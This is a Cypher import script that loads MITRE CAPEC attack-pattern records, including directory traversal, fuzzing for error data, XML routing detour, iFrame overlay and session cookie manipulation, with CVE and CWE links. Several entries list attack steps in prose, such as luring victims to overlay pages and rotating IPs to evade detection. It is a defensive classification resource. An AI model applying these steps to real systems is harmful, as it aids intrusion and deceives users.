CREATE (:AttackPattern{id: 212, name: "Functionality Misuse", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 169, text: "<div level=\"0\">\n  <p class=\"text\">The adversary has the capability to interact with the application directly.</p>\n  <p class=\"text\">The target system does not adequately implement safeguards to prevent misuse of authorized actions/processes.</p>\n</div>"});
CREATE (:Submission{id: 193});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 158});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Description Summary, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:Modification{id: 159});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Solutions_and_Mitigations"});
CREATE (:Description{id: 193, summary: "OrderedDict([('Text', 'An adversary leverages a legitimate capability of an application in such a way as to achieve a negative technical impact. The system functionality is not altered or modified but used in a way that was not intended. This is often accomplished through the overuse of a specific functionality or by leveraging functionality with design flaws that enables the adversary to gain access to unauthorized, sensitive data.')])"});
CREATE (:AttackPattern{id: 213, name: "DEPRECATED: Directory Traversal", status: "Deprecated", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 170, text: "<div level=\"0\">\n  <p class=\"text\">The target must leverage and access an underlying file system.</p>\n</div>"});
CREATE (:Submission{id: 194});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 160});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 161});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 44, name: "Directory Traversal"});
MERGE (:Date{date: "2017-01-09"});
CREATE (:Description{id: 194, summary: "OrderedDict([('Text', 'An attacker with access to file system resources, either directly or via application logic, will use various file path specification or navigation mechanisms such as \"..\" in path strings and absolute paths to extend their range of access to inappropriate areas of the file system. The attacker attempts to either explore the file system for recon purposes or access directories and files that are intended to be restricted from their access. Exploring the file system can be achieved through constructing paths presented to directory listing programs, such as \"ls\" and \\'dir\\', or through specially crafted programs that attempt to explore the file system. The attacker engaging in this type of activity is searching for information that can be used later in a more exploitive attack. Access to restricted directories or files can be achieved through modification of path references utilized by system applications.')])"});
CREATE (:CVE{id: "CVE-2012-2919", description: "<div level=\"0\">\n  <p class=\"text\">Directory traversal vulnerability in Upload/engine.php in Chevereto 1.9.1 allows remote attackers to determine the existence of arbitrary files via a .. (dot dot) in the v parameter..</p>\n</div>"});
CREATE (:CVE{id: "CVE-2012-1917", description: "<div level=\"0\">\n  <p class=\"text\">compose.php in @Mail WebMail Client in AtMail Open-Source before 1.05 does not properly handle ../ (dot dot slash) sequences in the unique parameter, which allows remote attackers to conduct directory traversal attacks and read arbitrary files via a ..././ (dot dot dot slash dot slash) sequence.</p>\n</div>"});
MERGE (:CWE{id: 22});
MERGE (:CWE{id: 893});
CREATE (:ResourcesRequired{id: 111, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have access to an application interface or a direct shell that allows them to inject directory strings and monitor the results.</p>\n</div>"});
CREATE (:AttackPattern{id: 214, name: "Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 171, text: "<div level=\"0\">\n  <p class=\"text\">The target application must fail to sanitize incoming messages adequately before processing and must generate a stack trace in at least some error situations.</p>\n</div>"});
CREATE (:Submission{id: 195});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 195, summary: "OrderedDict([('Text', \"An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes any stack traces produced by error messages. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to cause the targeted application to return an error including a stack trace, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. The stack trace enumerates the chain of methods that led up to the point where the error was encountered. This can not only reveal the names of the methods (some of which may have known weaknesses) but possibly also the location of class files and libraries as well as parameter values. In some cases, the stack trace might even disclose sensitive configuration or user information.\")])"});
CREATE (:CVE{id: "CVE-2006-2434", description: "<div level=\"0\">\n  <p class=\"text\">Unspecified vulnerability in WebSphere 5.1.1 (or any earlier cumulative fix) Common Configuration Mode + CommonArchive and J2EE Models might allow attackers to obtain sensitive information via the trace.</p>\n</div>"});
MERGE (:CWE{id: 209});
MERGE (:CWE{id: 388});
CREATE (:ResourcesRequired{id: 112, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the stack trace produced by the target application. Fuzzing tools, which automatically generate and send message variants, are necessary for this attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 215, name: "Fuzzing and observing application log data/errors for application mapping", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 172, text: "<div level=\"0\">\n  <p class=\"text\">The target application must fail to sanitize incoming messages adequately before processing.</p>\n</div>"});
CREATE (:Submission{id: 196});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 196, summary: "OrderedDict([('Text', \"An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. By observing logs and error messages, the attacker can learn details about the configuration of the target application and might be able to cause the target to disclose sensitive information.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Probing", description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses fuzzing tools to send random malformed messages to web server and observes for server's log or error message.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses fuzzing tools to send random malformed messages to web server and observes for server's log or error message.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The application's log or error messages contain sensitive information.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">There is no desired error message returned. This does not mean the application will not disclose sensitive information through error messages.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The application log or error messages contain sensitive information about the application."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Modify the parameters to get the desired information from the error messages.", description: "<div level=\"0\">\n  <p class=\"text\">Attacker usually needs to modify the fuzzing parameters according to the observed error messages to get the desired sensitive information for the application. To defeat correlation, the attacker may try changing the origin IP addresses or client browser identification strings or start a new session from where he left off in obfuscating the attack.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Modify the parameters in the fuzzing tool according to the observed error messages. Repeat with enough parameters until the application has been sufficiently mapped.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">If the application rejects the large amount of fuzzing messages from the same host machine, the attacker needs to hide the attacks by changing the IP addresses or other credentials.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The application errors messages/logs contain sensitive information mapping the application.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The application errors messages/logs have no sensitive information about the application.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets a list of sensitive information mapping the application."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:Reference{id: "REF-3", local_id: "R.215.1", title: "Common Weakness Enumeration (CWE)", section: "CWE-209: Information Exposure Through an Error Message", publisher: "The MITRE Corporation", link: "http://cwe.mitre.org/data/definitions/209.html"});
MERGE (:CWE{id: 209});
MERGE (:CWE{id: 532});
CREATE (:ResourcesRequired{id: 113, text: "<div level=\"0\">\n  <p class=\"text\">Fuzzing tools, which automatically generate and send message variants, are necessary for this attack. The attacker must have sufficient access to send messages to the target. The attacker must also have the ability to observe the target application's log and/or error messages in order to collect information about the target.</p>\n</div>"});
CREATE (:AttackPattern{id: 216, name: "Communication Channel Manipulation", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 173, text: "<div level=\"0\">\n  <p class=\"text\">The target application must leverage an open communications channel.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 174, text: "<div level=\"0\">\n  <p class=\"text\">The channel on which the target communicates must be vulnerable to interception (e.g., man in the middle attack).</p>\n</div>"});
CREATE (:Submission{id: 197});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 162});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns"});
CREATE (:Modification{id: 163});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required, Solutions_and_Mitigations"});
CREATE (:PreviousEntryName{id: 45, name: "Abuse of Communication Channels"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 197, summary: "OrderedDict([('Text', 'An adversary manipulates a setting or parameter on communications channel in order to compromise its security. This can result in information exposure, insertion/removal of information from the communications stream, and/or potentially system compromise.')])"});
CREATE (:ResourcesRequired{id: 114, text: "<div level=\"0\">\n  <p class=\"text\">A tool that is capable of viewing network traffic and generating custom inputs to be used in the attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 217, name: "Exploiting Incorrectly Configured SSL", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 175, text: "<div level=\"0\">\n  <p class=\"text\">Access to the client/server stream.</p>\n</div>"});
CREATE (:Submission{id: 198});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 164});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:PreviousEntryName{id: 46, name: "Exploiting Incorrectly Configured SSL Security Levels"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 198, summary: "OrderedDict([('Text', 'An adversary takes advantage of incorrectly configured SSL communications that enables access to data intended to be encrypted. The adversary may also use this type of attack to inject commands or other traffic into the encrypted stream to cause compromise of either the client or server.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine the configuration levels of either the server or client being targeted, preferably both. This is not a hard requirement, as the attacker can simply assume commonly exploitable configuration settings and blindly attempt them.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Provide controlled access to the server by the client, by either providing a link for the client to click on, or by positioning one's self at a place on the network to intercept and control the flow of data between client and server, e.g. MITM (man in the middle).</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Insert the malicious data into the stream that takes advantage of the configuration flaw.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2011-3389"});
MERGE (:CWE{id: 201});
CREATE (:ResourcesRequired{id: 115, text: "<div level=\"0\">\n  <p class=\"text\">The attacker needs the ability to sniff traffic, and optionally be able to route said traffic to a system where the sniffing of traffic can take place, and act upon the recovered traffic in real time.</p>\n</div>"});
CREATE (:AttackPattern{id: 218, name: "Spoofing of UDDI/ebXML Messages", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 176, text: "<div level=\"0\">\n  <p class=\"text\">The targeted business's UDDI or ebXML information must be served from a location that the attacker can spoof or compromise or the attacker must be able to intercept and modify unsecured UDDI/ebXML messages in transit.</p>\n</div>"});
CREATE (:Submission{id: 199});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 199, summary: "OrderedDict([('Text', 'An attacker spoofs a UDDI, ebXML, or similar message in order to impersonate a service provider in an e-business transaction. UDDI, ebXML, and similar standards are used to identify businesses in e-business transactions. Among other things, they identify a particular participant, WSDL information for SOAP transactions, and supported communication protocols, including security protocols. By spoofing one of these messages an attacker could impersonate a legitimate business in a transaction or could manipulate the protocols used between a client and business. This could result in disclosure of sensitive information, loss of message integrity, or even financial fraud.')])"});
MERGE (:CWE{id: 345});
CREATE (:ResourcesRequired{id: 116, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to force the target user to accept their spoofed UDDI or ebXML message as opposed to the a message associated with a legitimate company. Depending on the follow-on for the attack, the attacker may also need to serve its own web services.</p>\n</div>"});
CREATE (:AttackPattern{id: 219, name: "XML Routing Detour Attacks", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 177, text: "<div level=\"0\">\n  <p class=\"text\">The targeted system must have multiple stages processing of XML content.</p>\n</div>"});
CREATE (:Submission{id: 200});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 200, summary: "OrderedDict([('Text', 'An attacker subverts an intermediate system used to process XML content and forces the intermediate to modify and/or re-route the processing of the content. XML Routing Detour Attacks are Man in the Middle type attacks. The attacker compromises or inserts an intermediate system in the processing of the XML message. For example, WS-Routing can be used to specify a series of nodes or intermediaries through which content is passed. If any of the intermediate nodes in this route are compromised by an attacker they could be used for a routing detour attack. From the compromised system the attacker is able to route the XML process to other nodes of his or her choice and modify the responses so that the normal chain of processing is unaware of the interception. This system can forward the message to an outside entity and hide the forwarding and processing from the legitimate processing systems by altering the header information.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey the target", description: "<div level=\"0\">\n  <p class=\"text\">Using command line or an automated tool, an attacker records all instances of web services to process XML requests.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use automated tool to record all instances to process XML requests or find exposed WSDL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use tools to crawl WSDL</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The URL processes XML requests.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The application does not accept XML requests.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Identify SOAP messages that have multiple state processing.", description: "<div level=\"0\">\n  <p class=\"text\">Inspect instance to see whether the XML processing has multiple stages or not.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Inspect the SOAP message routing head to see whether the XML processing has multiple stages or not.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The SOAP message has multiple stage processing.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The SOAP message does not have intermediate nodes.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs which have multiple stages to process XML contents."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Launch an XML routing detour attack", description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message identified in the Explore phase. Thus, the attacker can route the XML message to the attacker controlled node (and access the message contents).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The XML message is routed to the attacker controlled node."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
MERGE (:Reference{id: "REF-1", local_id: "R.219.1", title: "WASC Threat Classification 2.0", section: "WASC-32 - Routing Detour", publisher: "The Web Application Security Consortium (WASC)", pubdate: "2010", link: "http://projects.webappsec.org/w/page/13246956/Routing-Detour"});
MERGE (:Reference{id: "REF-14", local_id: "R.219.2", author: "Andre Yee", title: "Threat Protection in a Service Oriented World", link: "http://www.unatekconference.com/images/pdfs/presentations/Yee.pdf"});
MERGE (:Reference{id: "REF-15", local_id: "R.219.3", author: "Pete Lindstrom", title: "Attacking & Defending Web Services", publisher: "SPiRE Security", pubdate: "2002", link: "http://www.webtorials.com/main/comnet/cn2003/web-service/24.pdf"});
MERGE (:CWE{id: 441});
MERGE (:CWE{id: 610});
CREATE (:ResourcesRequired{id: 117, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to insert or compromise a system into the processing path for the transaction.</p>\n</div>"});
CREATE (:AttackPattern{id: 22, name: "Exploiting Trust in Client", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 178, text: "<div level=\"0\">\n  <p class=\"text\">Server software must rely on client side formatted and validated values, and not reinforce these checks on the server side.</p>\n</div>"});
CREATE (:Submission{id: 201});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 165});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 47, name: "Exploiting Trust in Client (aka Make the Client Invisible)"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 201, summary: "OrderedDict([('Text', 'An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by placing themselves in the communication channel between client and server such that communication directly to the server is possible where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.')])"});
MERGE (:Reference{id: "REF-2", local_id: "R.22.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 290});
MERGE (:CWE{id: 287});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 200});
MERGE (:CWE{id: 693});
CREATE (:ResourcesRequired{id: 118, text: "<div level=\"0\">\n  <p class=\"text\">Ability to communicate synchronously or asynchronously with server</p>\n</div>"});
CREATE (:AttackPattern{id: 220, name: "Client-Server Protocol Manipulation", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 179, text: "<div level=\"0\">\n  <p class=\"text\">The client and/or server must utilize a protocol that has a weakness allowing manipulation of the interaction.</p>\n</div>"});
CREATE (:Submission{id: 202});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 202, summary: "OrderedDict([('Text', 'An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.')])"});
MERGE (:CWE{id: 757});
CREATE (:ResourcesRequired{id: 119, text: "<div level=\"0\">\n  <p class=\"text\">The adversary must be able to identify the weakness in the utilized protocol and exploit it. This may require a sniffing tool as well as packet creation abilities. The adversary will be aided if they can force the client and/or server to utilize a specific protocol known to contain exploitable weaknesses.</p>\n</div>"});
CREATE (:AttackPattern{id: 221, name: "XML External Entities", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 180, text: "<div level=\"0\">\n  <p class=\"text\">A server that has an implementation that accepts entities containing URI values.</p>\n</div>"});
CREATE (:Submission{id: 203});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 203, summary: "OrderedDict([('Text', 'This attack takes advantage of the entity replacement property of XML where the value of the replacement is a URI. A well-crafted XML document could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.')])"});
CREATE (:AttackPattern{id: 222, name: "iFrame Overlay", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 181, text: "<div level=\"0\">\n  <p class=\"text\">The victim is communicating with the target application via a web based UI and not a thick client. The victim's browser security policies allow iFrames. The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser). The victim has an active session with the target system. The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system.</p>\n</div>"});
CREATE (:Submission{id: 204});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 204, summary: "OrderedDict([('Text', \"In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attackers' malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks he or she is clicking on versus what he or she is actually clicking on.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Craft an iFrame Overlay page", description: "<div level=\"0\">\n  <p class=\"text\">The attacker crafts a malicious iFrame overlay page.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker leverages iFrame overlay capabilities to craft a malicious iFrame overlay page.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Overlay capabilities are enabled in the browser.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">The target website implements protection against iFrame Overlay (frame busting).</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A page is created that performs unseen actions when the user interacts with the visible UI."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Attacker tricks victim to load the iFrame overlay page", description: "<div level=\"0\">\n  <p class=\"text\">Attacker utilizes some form of temptation, misdirection or coercion to trick the victim to loading and interacting with the iFrame overlay page in a way that increases the chances that the victim will visit the malicious page.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Trick the victim to the malicious site by sending the victim an e-mail with a URL to the site.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Trick the victim to the malicious site by manipulating URLs on a site trusted by the victim.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Trick the victim to the malicious site through a cross-site scripting attack.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The victim loads the iFrame overlay page."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Trick victim into interacting with the iFrame overlay page in the desired manner", description: "<div level=\"0\">\n  <p class=\"text\">The attacker tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Hide action controls over very commonly used functionality.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Hide action controls over very psychologically tempting content.</p>\n</div>"});
MERGE (:Reference{local_id: "R.222.1", author: "Michal Zalewski", title: "Browser Security Handbook", publisher: "Google Inc.", pubdate: "2008", link: "http://code.google.com/p/browsersec/wiki/Main"});
MERGE (:Reference{local_id: "R.222.2", author: "M. Mahemoff", title: "Explaining the \"Don't Click\" Clickjacking Tweetbomb", publisher: "Software As She's Developed", pubdate: "February 12, 2009", link: "http://softwareas.com/explaining-the-dont-click-clickjacking-tweetbomb"});
CREATE (:ResourcesRequired{id: 120, text: "<div level=\"0\">\n  <p class=\"text\">No special resource required.</p>\n</div>"});
CREATE (:AttackPattern{id: 224, name: "Fingerprinting", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 182, text: "<div level=\"0\">\n  <p class=\"text\">A means by which to interact with the target system directly.</p>\n</div>"});
CREATE (:Submission{id: 205});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 166});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 167});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 205, summary: "OrderedDict([('Text', 'An adversary compares output from a target system to known indicators that uniquely identify specific details about the target. Fingerprinting by itself is not usually detrimental to the target. However, the information gathered through fingerprinting often enables an adversary to discover existing weaknesses in the target.')])"});
MERGE (:CWE{id: 200});
CREATE (:ResourcesRequired{id: 121, text: "<div level=\"0\">\n  <p class=\"text\">If on a network, the adversary needs a tool capable of viewing network communications at the packet level and with header information, like Mitmproxy, Wireshark, or Fiddler.</p>\n</div>"});
CREATE (:AttackPattern{id: 226, name: "Session Credential Falsification through Manipulation", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 183, text: "<div level=\"0\">\n  <p class=\"text\">The targeted application must use session credentials to identify legitimate users.</p>\n</div>"});
CREATE (:Submission{id: 206});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 206, summary: "OrderedDict([('Text', 'An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server. For example, a credential in the form of a web cookie might have a field that indicates the access rights of a user. By manually tweaking this cookie, a user might be able to increase their access rights to the server. Alternately an attacker may be able to manipulate an existing credential to appear as a different user. This attack differs from falsification through prediction in that the user bases their modified credentials off existing credentials instead of using patterns detected in prior credentials to create a new credential that is accepted because it fits the pattern. As a result, an attacker may be able to impersonate other users or elevate their permissions to a targeted service.')])"});
CREATE (:CVE{id: "CVE-2005-2252", description: "<div level=\"0\">\n  <p class=\"text\">PhpAuction 2.5 allows remote attackers to bypass authentication and gain privileges as another user by setting the PHPAUCTION_RM_ID cookie to the user ID.</p>\n</div>"});
